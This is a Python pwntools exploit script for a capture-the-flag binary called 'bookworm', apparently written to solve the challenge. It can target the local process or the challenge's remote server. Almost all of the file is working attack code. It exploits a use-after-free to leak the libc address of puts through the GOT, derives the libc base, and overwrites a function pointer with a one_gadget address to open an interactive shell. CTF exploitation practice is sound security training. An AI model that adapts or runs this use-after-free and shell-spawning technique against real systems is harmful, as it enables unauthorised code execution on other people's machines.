from pwn import *
import sys

#import kmpwn
sys.path.append('/home/vagrant/kmpwn')
from kmpwn import *
#fsb(width, offset, data, padding, roop)

#config
context(os='linux', arch='i386')
context.log_level = 'debug'

FILE_NAME = "./bookworm"
HOST = "cha.hackpack.club"
PORT = 41720 

if len(sys.argv) > 1 and sys.argv[1] == 'r':
	conn = remote(HOST, PORT)
else:
	conn = process(FILE_NAME)

elf = ELF(FILE_NAME)
addr_display = elf.symbols["display_summary"]
got_puts = elf.got["puts"]
plt_puts = elf.plt["puts"]
#addr_bss = elf.bss()
#addr_dynsym = elf.get_section_by_name('.dynsym').header['sh_addr']
#
libc = ELF('./libc.so.6')
off_puts = libc.symbols["puts"]
gadget = [0x4f2c5, 0x4f322, 0x10a38c]
#libc_binsh = next(libc.search("/bin/sh"))
def create(n_size, n, s_size, s):
	conn.sendlineafter(">> ", "1")
	conn.sendlineafter(": ", str(n_size))
	conn.sendafter(": ", n)
	conn.sendlineafter(": ", str(s_size))
	conn.sendafter(": ", s)

def delete(index):
	conn.sendlineafter(">> ", "2")
	conn.sendlineafter(": ", str(index))

def change(index, s_size, s):
	conn.sendlineafter(">> ", "3")
	conn.sendlineafter(": ", str(index))
	conn.sendlineafter(": ", str(s_size))
	conn.sendafter(": ", s)

def display(index):
	conn.sendlineafter(">> ", "4")
	conn.sendlineafter(": ", str(index))

def exploit():
	create(8, "0\n", 8, "0\n") #0
	delete(0)

	payload = p64(plt_puts)
	payload += p64(0)
	payload += p64(got_puts)
	create(0x28, "1", 0x18-1, payload[:-1]) #1
	display(0) # use after free
	libc_puts = u64(conn.recv(6) + "\x00\x00")
	libc_base = libc_puts - off_puts
	one_gadget = libc_base + gadget[2]	
	payload = p64(one_gadget)
	payload += "\n"
	change(1, 0x18-1, payload)
	display(0) # use after free
	print hex(libc_base)
	conn.interactive()	

if __name__ == "__main__":
	exploit()	
